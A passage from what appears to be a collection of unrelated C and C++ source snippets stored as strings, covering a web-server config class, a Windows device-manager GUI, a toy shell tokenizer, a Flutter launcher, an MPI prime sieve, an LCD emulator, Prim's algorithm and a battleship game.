this->upload_store = pointer.upload_store;\n    this->upload_pass = pointer.upload_pass;\n    this->nbr_upload_set = pointer.nbr_upload_set;\n    this->upload_set_form_field = pointer.upload_set_form_field;\n\n    return (*this);\n}\n\nvoid    CFGlocation::clear(void)\n{\n    this->name_location.clear();\n    this->root.clear();\n    this->index.clear();\n    this->try_files.clear();\n    this->allow_methods.clear();\n    this->autoindex.clear();\n    this->fastcgi_pass.clear();\n    this->fastcgi_index.clear();\n    this->nbrparam = 0;\n    this->fastcgi_param.clear();\n    this->client_max_body_size = 0;\n    this->upload_store.clear();\n    this->upload_pass.clear();\n    this->nbr_upload_set = 0;\n    this->upload_set_form_field.clear();\n}\n\nvoid    CFGlocation::printData(void)\n{\n    std::cout << \"Name location: \" << name_location << std::endl;\n    std::cout << \"root: \" << root << std::endl;\n    std::cout << \"index: \" << index << std::endl;\n    std::cout << \"try_files: \" << try_files << std::endl;\n    std::cout << \"allow_methods: \" << allow_methods << std::endl;\n    std::cout << \"autoindex: \" << autoindex << std::endl << std::endl;\n\n    std::cout << \"fastcgi_pass: \" << fastcgi_pass << std::endl;\n    std::cout << \"fastcgi_index: \" << fastcgi_index << std::endl;\n    std::cout << \"Number of fastcgi_param: \" << nbrparam << std::endl;\n    for (int i = 0; i < getNbrparam(); i++)\n        std::cout << \"fastcgi_param: \" << fastcgi_param[i] << std::endl << std::endl;\n    \n    std::cout << \"client_max_body_size: \" << client_max_body_size << std::endl;\n    std::cout << \"upload_store: \" << upload_store << std::endl;\n    std::cout << \"upload_pass: \" << upload_pass << std::endl;\n    std::cout << \"Number of upload_set_form_field: \" << nbr_upload_set << std::endl;\n    for (int i = 0; i < getNbrUploadSet(); i++)\n        std::cout << \"upload_set_form_field: \" << upload_set_form_field[i] << std::endl;\n}\n\n/*------- SETS ---------*/\n\nvoid        CFGlocation::SetName(std::string data)\n{\n    this->name_location = data;\n}\n\nvoid        CFGlocation::SetRoot(std::string data)\n{\n    this->root = data;\n}\n\nvoid        CFGlocation::SetIndex(std::string data)\n{\n    this->index = data;\n}\n\nvoid        CFGlocation::SetTryFiles(std::string data)\n{\n    this->try_files = da",
    "#include\"Device.h\"\n#include \"MyWnds.h\"\n#include <CommCtrl.h>\n#include \"Data.hpp\"\n#include <windowsx.h>\n\n//\u521d\u59cb\u5316\u603b\u4e2a\u6570\u4e3a0\nUINT Device::mCount = 0;\n\nHWND Device::DevInfoProc_hwnd;\nUINT Device::DevInfoProc_uMsg;\nWPARAM Device::DevInfoProc_wParam;\nLPARAM Device::DevInfoProc_lParam;\n\nBYTE Device::devInfoFlag;\n\nDevice Device::currentDev = { 0 };\n\n//\u8bbe\u5907\u4fe1\u606f\nLRESULT CALLBACK Device::DevInfoProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n\tDevice::DevInfoProc_hwnd = hwnd;\n\tDevice::DevInfoProc_uMsg = uMsg;\n\tDevice::DevInfoProc_wParam = wParam;\n\tDevice::DevInfoProc_lParam = lParam;\n\tswitch (uMsg)\n\t{\n\tcase WM_CTLCOLORSTATIC:\n\t{\n\t\t//\u66f4\u6539\u53ea\u8bfb\u72b6\u6001\u4e0b\u7684\u7f16\u8f91\u6846\u7684\u80cc\u666f\u8272\u4e3a\u767d\u8272\n\t\tMyWnds::hDC = (HDC)Device::DevInfoProc_wParam;\n\t\tSetTextColor(MyWnds::hDC, RGB(0, 0, 0));//\u6587\u5b57\u524d\u666f\u8272\n\t\t//SetBkColor(MyWnds::hDC, RGB(144, 244, 124));//\u6587\u5b57\u80cc\u666f\u8272\n\t\tSetBkMode(MyWnds::hDC, TRANSPARENT);//\u80cc\u666f\u900f\u660e\n\t\tMyWnds::hDC = NULL;\n\t\treturn (INT_PTR)CreateSolidBrush(RGB(255, 255, 255));\n\t}\n\tcase WM_NOTIFY:\n\t\tDevice::DevInfoProc_WM_NOTIFY();\n\t\tbreak;\n\tcase WM_PAINT:\n\t\tDevice::DevInfoProc_WM_PAINT();\n\t\tbreak;\n\tcase WM_CREATE:\n\t\tDevice::DevInfoProc_WM_CREATE();\n\t\tbreak;\n\tdefault://\u672a\u81ea\u5b9a\u4e49\u7684\u5176\u4ed6\u6d88\u606f\n\t\treturn DefWindowProc(hwnd, uMsg, wParam, lParam);//\u9ed8\u8ba4\u7a97\u53e3\u8fc7\u7a0b\n\t}\n\treturn 0;\n}\n\nvoid Device::DevInfoProc_WM_NOTIFY() {\n\tswitch (((LPNMHDR)Device::DevInfoProc_lParam)->code) \n\t{\n\tcase NM_CLICK:case NM_RETURN://\u5355\u51fb\n\t{\n\t\tswitch (LPNMHDR(Device::DevInfoProc_lParam)->idFrom) {\n\t\tcase devSaveSysLinkID:\n\t\t{\n\t\t\tTCHAR tempTCHAR[devIntro];\n\t\t\tEdit_GetText(GetDlgItem(Device::DevInfoProc_hwnd, devIntroEditID), tempTCHAR, devIntro);//\u83b7\u53d6\u4ecb\u7ecd\n\t\t\tif (*tempTCHAR) {\n\t\t\t\t//\u4fee\u6539\u8bbe\u5907\u4ecb\u7ecd\n\t\t\t\t_stprintf_s(Device::currentDev.mIntro, tempTCHAR);\n\t\t\t\tData<Device>::DataModify(_T(\"Device.dat\"), Device::currentDev);\n\t\t\t\t//\u9500\u6bc1\u63a7\u4ef6\n\t\t\t\tDestroyWindow(GetDlgItem(Device::DevInfoProc_hwnd, devSaveSysLinkID));\n\t\t\t\tEdit_SetReadOnly(GetDlgItem(Device::DevInfoProc_hwnd, devIntroEditID), TRUE);//\u8bbe\u7f6e\u53ea\u8bfb\u72b6\u6001\n\t\t\t\t//\u663e\u793a\u201c\u7f16\u8f91\u201d\u63a7\u4ef6\n\t\t\t\tSendMessage(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\t\t\t\tMoveWindow(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), int(0.7 * MyWnds::homePageWidth), int(0.4 * MyWnds::homePageHeight), int(0.1 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight), true);\n\t\t\t\tShowWindow(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), SW_SHOW);\n\t\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\t\tInvalidateRect(Device::DevInfoProc_hwnd, NULL, TRUE);\n\t\t\t\tSendMessage(Device::DevInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tMessageBox(Device::DevInfoProc_hwnd, _T(\"\u60a8\u7684\u8f93\u5165\u65e0\u6548\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\"), _T(\"\u9519\u8bef\"), MB_OK | MB_ICONERROR);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase editDevIntroSysLinkID:\n\t\t{\n\t\t\t//\u9690\u85cf\u201c\u7f16\u8f91\u201d\u63a7\u4ef6\n\t\t\tShowWindow(GetDlgItem(Device::DevInfoProc_hwnd, editDevIntroSysLinkID), SW_HIDE);\n\t\t\t//\u4fdd\u5b58\n\t\t\tCreateWindowEx(\n\t\t\t\t0, _T(\"SysLink\"), _T(\"<A HREF=\\\"\u4fdd\u5b58\\\">\u4fdd\u5b58</A>\"), WS_CHILD | WS_VISIBLE | LWS_TRANSPARENT | WS_TABSTOP,\n\t\t\t\tint(0.7 * MyWnds::homePageWidth), int(0.4 * MyWnds::homePageHeight), int(0.1 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight),\n\t\t\t\tDevice::DevInfoProc_hwnd, HMENU(devSaveSysLinkID), MyWnds::hInstance, NULL\n\t\t\t);\n\t\t\tSendMessage(GetDlgItem(Device::DevInfoProc_hwnd, devSaveSysLinkID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\n\t\t\tEdit_SetReadOnly(GetDlgItem(Device::DevInfoProc_hwnd, devIntroEditID), FALSE);//\u8bbe\u7f6e\u53ea\u8bfb\u72b6\u6001\n\n\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\tInvalidateRect(Device::DevInfoProc_hwnd, NULL, TRUE);\n\t\t\tSendMessage(Device::DevInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\n\t\t\tbreak;\n\t\t}\n\t\tcase returnSysLinkID:\n\t\t{\n\t\t\t//\u9500\u6bc1\u63a7\u4ef6\n\t\t\tMyWnds::DestroyControl(Device::DevInfoProc_hwnd, { returnSysLinkID, devIntroEditID , editDevIntroSysLinkID ,devSaveSysLinkID});\n\t\t\t//\u521b\u5efa\u63a7\u4ef6\n\t\t\tSendMessage(GetDlgItem(MyWnds::MainWndProc_hwnd, devInfoWndID), WM_CREATE, NULL, NULL);\n\t\t\t//\u66f4\u65b0\u6807\u8bb0\n\t\t\tDevice::devInfoFlag = 0;\n\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\tInvalidateRect(Device::DevInfoProc_hwnd, NULL, TRUE);\n\t\t\tSendMessage(Device::DevInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\t\t\tbreak;\n\t\t}\n\t\tcase dataInfoListID:\n\t\t{\n\t\t\t//\u66f4\u65b0\u70b9\u51fb\u7684\u5217\u8868\u5750\u6807\n\t\t\tMyWnds::x_Listview = LPNMITEMACTIVATE(Device::DevInfoProc_lParam)->iSubItem;\n\t\t\tMyWnds::y_Listview = LPNMITEMACTIVATE(Device::DevInfoProc_lParam)->iItem;\n\t\t\tbreak;\n\t\t}\n\t\tcase dataInfoSysLinkID:\n\t\t{\n\t\t\tif (PNMLINK(Device::DevInfoProc_lParam)->item.iLink == 0)//\u589e\u52a0\n\t\t\t{\n\t\t\t\tMyWnds::dialogFlag = dialogDevAdd;\n\t\t\t\tMyWnds::Dialog();\n\n\t\t\t}\n\t\t\telse if (PNMLINK(Device::DevInfoProc_lParam)->item.iLink == 1)//\u4fee\u6539\n\t\t\t{\n\t\t\t\tif ((MyWnds::x_Listview == -1 && MyWnds::y_Listview == 0) || MyWnds::y_Listview >= ListView_GetItemCount(GetDlgItem(Device::DevInfoProc_hwnd, dataInfoListID))) {\n\t\t\t\t\tMessageBox(Device::DevInfoProc_hwnd, _T(\"\u8bf7\u9009\u62e9\u8981\u4fee\u6539\u7684\u8bbe\u5907\"), _T(\"\u63d0\u793a\"), MB_ICONINFORMATION);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tMyWnds::dialogFlag = dialogDevModify;\n\t\t\t\t\tMyWnds::Dialog();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (PNMLINK(Device::DevInfoProc_lParam)->item.iLink == 2)//\u5220\u9664\n\t\t\t{\n\t\t\t\tTCHAR tempTCHAR[21] = {};\n\t\t\t\tif (MessageBox(Device::DevInfoProc_hwnd, _T(\"\u786e\u5b9a\u8981\u5220\u9664\u8fd9\u4e9b\u8bbe\u5907\u5417\uff1f\"), _T(\"\u63d0\u793a\"), MB_OKCANCEL | MB_ICONINFORMATION) == IDOK) {\n\t\t\t\t\tfor (int y = ListView_GetItemCount(GetDlgItem(Device::D",
    "#include <cstdlib>\n#include <iostream>\n#include <ostream>\n#include <unistd.h>\n#include <cstring>\n#include <sys/wait.h>\n#include <vector>\n#include <fcntl.h>\n\n#include \"../include/commands.h\"\n// provides function is_pos_quoted, is_char_on_pos\n#include \"../include/row_input_handle.h\"\n\nstatic bool execute_and_wait(const std::vector<std::string> &tokens);\nstatic bool bg_mode_execute(const std::vector<std::string> &tokens);\nstatic std::vector<char*> vector_to_pointer_vector(const std::vector<std::string> \n        &tokens);\n// changes directory, returns PID of a current process on success, otherwise -1\nstatic int execute_change_of_directory(const std::vector<std::string> &tokens);\n// executes changes passed in vector of strings using execvp, return PID on\n// success, -1 otherwise\nstatic int execute_tokens_return_pid(const std::vector<std::string> &tokens);\n// replaces passed std_fd with passed fd, returns copy of std_fd\nstatic int redirect(int std_fd, int file_fd);\nstatic std::string remove_tokens_for_redirection(std::vector<std::string> &tokens, size_t pos);\n\n\nbool Commands::string_to_tokens(const std::string &src)\n{\n    std::string token = \"\";\n    size_t pos;\n    for(pos = 0; pos < src.length(); ++pos)\n    {\n        // if char is unshielded quote \n        if(src.at(pos) == '\"' && !is_char_on_pos(src, pos - 1, '\\\\'))\n        {\n            // empty quotes \"\" are considered a suitable token\n            if(is_pos_quoted(src, pos))\n            {\n                tokens.push_back(token);\n            }\n            else\n            {\n                token.empty() ? void() : tokens.push_back(token);           \n            }\n            token = \"\";\n        }\n        else if(src.at(pos) == '\\\\' && !is_pos_quoted(src, pos) && \n                !is_char_on_pos(src, pos - 1, '\\\\'))\n        {\n            // do nothing\n        }\n        else if((src.at(pos) == ' ' || src.at(pos) == '\\t') && \n                !is_pos_quoted(src, pos) &&\n                !is_char_on_pos(src, pos-1, '\\\\'))\n        {\n            token.empty() ? void() : tokens.push_back(token);\n            token = \"\";\n        }\n        else if(src.at(pos) == '<' && !is_pos_quoted(src, pos) && \n                !is_char_on_pos(src, pos - 1, '\\\\'))\n        {\n            // pushes current token and \"<\" redirector (redirectors are \n            // considered an independent tokens for easier processing)\n            token.empty() ? void() : tokens.push_back(token);\n            tokens.push_back(\"<\");\n            token = \"\";\n        }\n        else if(src.at(pos) == '>' && !is_pos_quoted(src, pos) && \n                !is_char_on_pos(src, pos - 1, '\\\\'))\n        {\n            token.empty() ? void() : tokens.push_back(token);\n            token = \"\";\n            if(is_char_on_pos(src, pos + 1, '>'))\n            {\n                tokens.push_back(\">>\");\n                // we should skip next step if next symbol is also >\n                pos++;\n            }\n            else\n            {\n                tokens.push_back(\">\");\n            }\n        }\n        else\n        {\n            token += src.at(pos);\n        }\n    }\n    // pushes last token if it exists\n    token.empty() ? void() : tokens.push_back(token);\n    // checks if last character is quoted as it means unmatched quote\n    if(is_pos_quoted(src, pos -1))\n    {\n        std::cout << \"Error: unmatched quote.\" << std::endl;\n        return false;\n    }\n    // redirection analysis\n    set_redirection(); \n    return true;\n}\n/*\nbool Commands::string_to_tokens(const std::string &src)\n{\n    // variables-modifiers of input\n    bool is_quoted = false;\n    bool is_shilded = false;\n    bool is_previous_sep = false;\n    bool is_append_ch = false;\n    std::string del;\n    std::string token;\n    for(const char &ch : src)\n    { \n        if(ch == '\"' && !is_shilded)\n        {\n            if(is_quoted)\n            {\n                // text inside double quotes is considered a token\n                tokens.push_back(token);\n            } \n            else\n            {\n                // empty token can be entered only using \"\"\n                if(!token.empty())\n                {\n                tokens.push_back(token);\n                }\n            }\n            token = \"\";\n            is_quoted ^= true;\n        } \n        else if(is_shilded)\n        {\n            // other symbols after shileding symbols are skipped\n            switch(ch)\n            {\n                case '\"': token += '\"'; break;\n                case '\\\\': token += '\\\\'; break;\n                // can be implemented later\n            } \n        }\n        else if((ch == ' ' || ch == '\\t') && !is_quoted && !is_previous_sep)\n        {\n            if(!token.empty())\n            {\n                // pushes token after separator\n                tokens.push_back(token);\n                token = \"\";\n            }\n        }\n        else if((ch == '\\\\' && !is_shilded) || ((ch == '\\t' || ch == ' ') && is_previous_sep))\n        {\n            // these cases are handled separetly because the",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"crud1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"mpi.h\"\n#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\n#define MIN(a, b) ((a) < (b) ? (a) : (b))\n#define LL long long\n\nint main(int argc, char *argv[])\n{\n    LL count;            /* Local prime count */\n    double elapsed_time; /* Parallel execution time */\n    LL first;            /* Index of first multiple */\n    LL global_count = 0; /* Global prime count */\n    LL high_index;       /* Highest index on this proc */\n    LL i;                /*a temp var for some circulate*/\n    int id;              /* Process ID number */\n    LL index;            /* Index of current prime */\n    LL low_index;        /* Lowest index on this proc */\n    char *marked;        /* Portion of 5,7,11,..,'n' */\n    char *marked0;       /* Portion of 5,7,11,..,'sqrt(n)' */\n    LL n;                /* Sieving from 2, ..., 'n' */\n    int p;               /* Number of processes */\n    LL prime;            /* Current prime */\n    LL size;             /* Elements in 'marked' */\n    LL size0;            /* Elements in 'marked0' */\n    // LL    low0;         //lowest index for a process to count the prime in the marked0,be removed in this optimize\n    // LL    high0;        //highest index for a process to count the prime in the marked0,be removed in this optimize\n    LL high_value0; /* the highest value in 'marked0' */\n    LL start_n;     /* sqrt(n) */\n    LL r;           /* prime/3 */\n    LL q;           /* prime%3 */\n    LL t;           /* thr number which B_low_value greater than the multiple just smaller than it */\n    // initial the MIP environment\n    MPI_Init(&argc, &argv);\n\n    /* Start the timer */\n\n    MPI_Comm_rank(MPI_COMM_WORLD, &id);\n    MPI_Comm_size(MPI_COMM_WORLD, &p);\n    MPI_Barrier(MPI_COMM_WORLD);\n    elapsed_time = -MPI_Wtime();\n    // check the input\n    if (argc != 2)\n    {\n        if (!id)\n            printf(\"Command line: %s <m>\\n\", argv[0]);\n        MPI_Finalize();\n        exit(1);\n    }\n    // caculate basic vars about the range of the num which the process responsible to\n    n = atoll(argv[1]);\n    start_n = (int)sqrt((double)n);\n    size0 = start_n / 3; // the range where the process find the var 'prime'\n    if (((size0 - 1) * 3 + 5 - (size0 - 1) % 2) > start_n)\n        size0--;\n    // LL num = n/3 - size0;\n    LL num = n / 3; // the length of the array in the process\n\n    /* Figure out this process's share of the array, as\n       well as the integers represented by the first and\n       last array elements */\n\n    // low_index = size0 + id*(num - 1)/p;                                  to remove the 'marked0' part from the main circulation\n    // high_value = size0 + (id+1) * (num - 1) / p - 1;                     seem to be feckless in shrink the running time\n    low_index = id * (num - 1) / p;\n    high_index = (id + 1) * (num - 1) / p - 1;\n    if (id == p - 1)\n    { // make sure the value the high_index linked is not out of range\n        while ((3 * high_index + 5 - high_index % 2) > n)\n            high_index--;\n    }\n    size = high_index - low_index + 1;\n\n    /* Allocate this process's share of the array. */\n    marked0 = (char *)malloc(size0);\n    if (marked0 == NULL)\n    {\n        printf(\"Cannot allocate enough memory\\n\");\n        MPI_Finalize();\n        exit(1);\n    }\n    for (i = 0; i < size0; i++)\n    {\n        marked0[i] = 0;\n    } // initial the marked0\n    if ((size0 - 1) % 2 == 0)\n        high_value0 = (size0 - 1) * 3 + 5; // caculate the high_value0\n    else\n        high_value0 = (size0 - 1) * 3 + 4;\n    index = 0;\n    prime = 5;\n    do\n    {\n        r = prime / 3;\n        q = prime % 3; // q=1 or 2\n        if (q == 1)\n        {\n            // prime + 4 + 6i = (3r + 1)*5 => i = 2r            6k+1 array\n            for (i = 2 * r; prime + 4 + 6 * i <= high_value0; i += prime)\n            {\n                marked0[(prime + 4 + 6 * i - 5) / 3] = 1;\n            }\n            // prime + 6i*prime = any integer => i = 1          6k-1 array\n            for (i = 1; prime + prime * i * 6 <= high_value0; i++)\n            {\n                marked0[((prime + prime * i * 6) - 4) / 3] = 1;\n            }\n        }\n        else\n        {\n            // prime + 2 + 6i = (3r + 2)*5 => i = 2r + 1        6k-1 array\n            for (i = 2 * r + 1; prime + 2 + 6 * i <= high_value0; i += prime)\n            {\n                marked0[(prime + 2 + 6 * i - 4) / 3] = 1;\n            }\n            // prime + 6i*prime = any integer => i = 1          6k+1 array\n            for (i = 1; prime + prime * i * 6 <= high_value0; i++)\n            {\n                marked0[((prime + prime * i * 6) - 5) / 3] = 1;\n            }\n        }\n\n        while (marked0[++index])\n            ;\n        prime = index * 3 + 5 - index % 2;\n    } while (prime * prime <= start_n);\n    count = 0;\n    // low0 = id*size0/p;                to count primes in the 1/p of 'marked0' array\n    // high0 = (id+1)*size0/p - 1;       var \"high0\" and \"low0\" represent the edge of the index\n    // for(i = low0;i<=high0;i++)\n    //     if(!marked0[i]) ",
    "#include \"lcd.h\"\n\nLCD::LCD(int width, int height, int pixSize, int pixSpacing, int margin, uint32_t bgColor, uint32_t whiteColor, uint32_t blackColor) {\n    this->width = width;\n    this->height = height;\n    this->pixSize = pixSize;\n    this->pixSpacing = pixSpacing;\n    this->margin = margin;\n    this->bgColor = bgColor;\n    this->whiteColor = whiteColor;\n    this->blackColor = blackColor;\n\n    pixDelta = pixSize + pixSpacing;\n\n    // Compute framebuffer size\n    fbWidth = width*pixSize + (width - 1)*pixSpacing + margin*2;\n    fbHeight = height*pixSize + (height - 1)*pixSpacing + margin*2;\n\n    // Allocate framebuffer and bitbuffer\n    fb = new uint32_t[fbWidth*fbHeight];\n    bb = new uint8_t[width*height];\n\n    // Init bitbuffer\n    memset(bb, 0, width*height);\n\n    // Fill background\n    for (int i = 0; i < fbWidth*fbHeight; i++) {\n        fb[i] = bgColor;\n    }\n\n    // Initial render\n    render(0, 0, width, height);\n}\n\nint LCD::getFBWidth() {\n    return fbWidth;\n}\n\nint LCD::getFBHeight() {\n    return fbHeight;\n}\n\nconst uint32_t* LCD::getFB() {\n    return fb;\n}\n\nvoid LCD::blit(int page, int column, const uint8_t* bits, int count) {\n    // Blit to bitbuffer\n    for (int i = 0; i < count; i++) {\n        int col = (column+i)%width;\n        int p = (page + (column+i)/width)%(height/8);\n        bb[(p*8 + 7)*width + col] = (bits[i] >> 0) & 1;\n        bb[(p*8 + 6)*width + col] = (bits[i] >> 1) & 1;\n        bb[(p*8 + 5)*width + col] = (bits[i] >> 2) & 1;\n        bb[(p*8 + 4)*width + col] = (bits[i] >> 3) & 1;\n        bb[(p*8 + 3)*width + col] = (bits[i] >> 4) & 1;\n        bb[(p*8 + 2)*width + col] = (bits[i] >> 5) & 1;\n        bb[(p*8 + 1)*width + col] = (bits[i] >> 6) & 1;\n        bb[(p*8 + 0)*width + col] = (bits[i] >> 7) & 1;\n    }\n\n    // Render page (TODO: Can be more optimized)\n    render(0, 0, width, height);\n}\n\nvoid LCD::render(int x, int y, int w, int h) {\n    int endY = y + h;\n    int endX = x + w;\n    for (int _y = y; _y < endY; _y++) {\n        for (int _x = x; _x < endX; _x++) {\n            int xx = _x*pixDelta + margin;\n            int yy = _y*pixDelta + margin;\n\n            uint32_t pixColor = bb[_y*width + _x] ? blackColor:whiteColor;\n\n            for (int i = 0; i < pixSize; i++) {\n                for (int j = 0; j < pixSize; j++) {\n                    fb[(yy+i)*fbWidth + xx+j] = pixColor;\n                }\n            }\n        }\n    }\n}",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass tree\r\n{\r\n\tint a[20][20],l,u,w,i,j,v,e,visited[20];\r\npublic:\r\n\t\tvoid input();\r\n\t\tvoid display();\r\n\t\tvoid minimum();\r\n};\r\n\r\nvoid tree::input()\r\n{\r\n\tcout<<\"Enter the no. of branches: \";\r\n\tcin>>v;\r\n\r\n\tfor(i=0;i<v;i++)\r\n\t{\r\n\t\tvisited[i]=0;\r\n\t\tfor(j=0;j<v;j++)\r\n\t\t{\r\n\t\t\ta[i][j]=999;\r\n\t\t}\r\n\t}\r\n\r\n\tcout<<\"\\nEnter the no. of connections: \";\r\n\tcin>>e;\r\n\r\n\tfor(i=0;i<e;i++)\r\n\t{\r\n\t\tcout<<\"Enter the end branches of connections:  \"<<endl;\r\n\t\tcin>>l>>u;\r\n\t\tcout<<\"Enter the phone company charges for this connection:  \";\r\n\t\tcin>>w;\r\n\t\ta[l-1][u-1]=a[u-1][l-1]=w;\r\n\t}\r\n}\r\n\r\nvoid tree::display()\r\n{\r\n\tcout<<\"\\nAdjacency matrix:\";\r\n\tfor(i=0;i<v;i++)\r\n\t{\r\n\t\tcout<<endl;\r\n\t\tfor(j=0;j<v;j++)\r\n\t\t{\r\n\t\t\tcout<<a[i][j]<<\"   \";\r\n\t\t}\r\n\t\tcout<<endl;\r\n\t}\r\n}\r\n\r\nvoid tree::minimum()\r\n{\r\n\tint p=0,q=0,total=0,min;\r\n\tvisited[0]=1;\r\n\tfor(int count=0;count<(v-1);count++)\r\n\t{\r\n\t\tmin=999;\r\n\t\tfor(i=0;i<v;i++)\r\n\t\t{\r\n\t\t\tif(visited[i]==1)\r\n\t\t\t{\r\n\t\t\t\tfor(j=0;j<v;j++)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(visited[j]!=1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tif(min > a[i][j])\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tmin=a[i][j];\r\n\t\t\t\t\t\t\tp=i;\r\n\t\t\t\t\t\t\tq=j;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tvisited[p]=1;\r\n\t\tvisited[q]=1;\r\n\t\ttotal=total + min;\r\n\t\tcout<<\"Minimum cost connection is\"<<(p+1)<<\" -> \"<<(q+1)<<\"  with charge : \"<<min<< endl;\r\n\t\t\r\n\t}\r\n\tcout<<\"The minimum total cost of connections of all branches is: \"<<total<<endl;\r\n}\r\n\r\nint main()\r\n{\r\n\tint ch;\r\n\ttree t;\r\n\tdo\r\n\t{\r\n\t\tcout<<\"==========PRIM'S ALGORITHM=================\"<<endl;\r\n\t\tcout<<\"\\n1.INPUT\\n \\n2.DISPLAY\\n \\n3.MINIMUM\\n\"<<endl;\r\n\t\tcout<<\"Enter your choice :\"<<endl;\r\n\t\tcin>>ch;\r\n\t\r\n\tswitch(ch)\r\n\t{\t\r\n\tcase 1: cout<<\"*******INPUT YOUR VALUES*******\"<<endl;\t\r\n\t\tt.input();\r\n\t\tbreak;\r\n\r\n\tcase 2: cout<<\"*******DISPLAY THE CONTENTS********\"<<endl;\r\n\t\tt.display();\r\n\t\tbreak;\r\n\r\n\tcase 3: cout<<\"*********MINIMUM************\"<<endl;\r\n\t\tt.minimum();\r\n\t\tbreak;\r\n\t}\r\n\t\r\n\t}while(ch!=4);\r\n\treturn 0;\r\n}\r\n\r\n\r\nOutput :-\r\n==========PRIM'S ALGORITHM=================\r\n\r\n1.INPUT\r\n \r\n2.DISPLAY\r\n \r\n3.MINIMUM\r\n\r\nEnter your choice :\r\n1\r\n*******INPUT YOUR VALUES*******\r\nEnter the no. of branches: 4\r\n\r\nEnter the no. of connections: 5\r\nEnter the end branches of connections:  \r\n1\r\n2\r\nEnter the phone company charges for this connection:  150\r\nEnter the end branches of connections:  \r\n1\r\n3\r\nEnter the phone company charges for this connection:  200\r\nEnter the end branches of connections:  \r\n2\r\n3\r\nEnter the phone company charges for this connection:  250\r\nEnter the end branches of connections:  \r\n3\r\n4\r\nEnter the phone company charges for this connection:  450\r\nEnter the end branches of connections:  \r\n2\r\n4\r\nEnter the phone company charges for this connection:  550\r\n==========PRIM'S ALGORITHM=================\r\n\r\n1.INPUT\r\n \r\n2.DISPLAY\r\n \r\n3.MINIMUM\r\n\r\nEnter your choice :\r\n2\r\n*******DISPLAY THE CONTENTS********\r\n\r\nAdjacency matrix:\r\n999   150   200   999   \r\n\r\n150   999   250   550   \r\n\r\n200   250   999   450   \r\n\r\n999   550   450   999   \r\n==========PRIM'S ALGORITHM=================\r\n\r\n1.INPUT\r\n \r\n2.DISPLAY\r\n \r\n3.MINIMUM\r\n\r\nEnter your choice :\r\n3\r\n*********MINIMUM************\r\nMinimum cost connection is1 -> 2  with charge : 150\r\nMinimum cost connection is1 -> 3  with charge : 200\r\nMinimum cost connection is3 -> 4  with charge : 450\r\nThe minimum total cost of connections of all branches is: 800\r\n",
    "#include \"battleship.H\"\n\n///\n/// The main function! This handles user input in the setup phase and attack phase, and contains the while loop that runs the game itself. \n///\n\nint main() {\n    ///\n    /// Setup phase: read in the user ships\n    ///\n    std::vector<std::string> ship_names{\"Carrier\",\"Destroyer\",\"Submarine\",\"Patrol\"};\n    std::vector<int> ship_lengths{5,4,3,2};\n    Grid player_grid = Grid();\n    for (int i=0; i<ship_names.size(); i++) {\n        read_in_ship(ship_names[i],ship_lengths[i],player_grid);\n        std::cout << player_grid;\n    }\n\n    Grid computer_grid = make_computer_grid(ship_names,ship_lengths);\n    std::cout << std::endl << \"Computer grid: \" <<std::endl;\n    print_hidden(computer_grid);\n\n    bool game_end = false;\n    int xt; //For reading in attacks\n    int yt;\n\n    ///\n    /// Loop to run the attack phase! The user enters a coordinate pair to attack, and the attack() function checks whether it hits anything,\n    /// reports which ship it hit, and updates the Ship and Grid objects. Then, attack_of_the_computer generates a location to attack, and\n    /// calls attack(). \n    ///\n    while (!game_end) {\n        std::cout << \"Enter the x coordinate of your attack: \";\n        std::cin >> xt;\n        std::cout << std::endl << \"Enter the y coordinate of your attack: \";\n        std::cin >> yt;\n        std::cout << std::endl;\n        int attack_coord = coord_to_grid(xt,yt);\n        attack(computer_grid,attack_coord,false);\n        \n        if 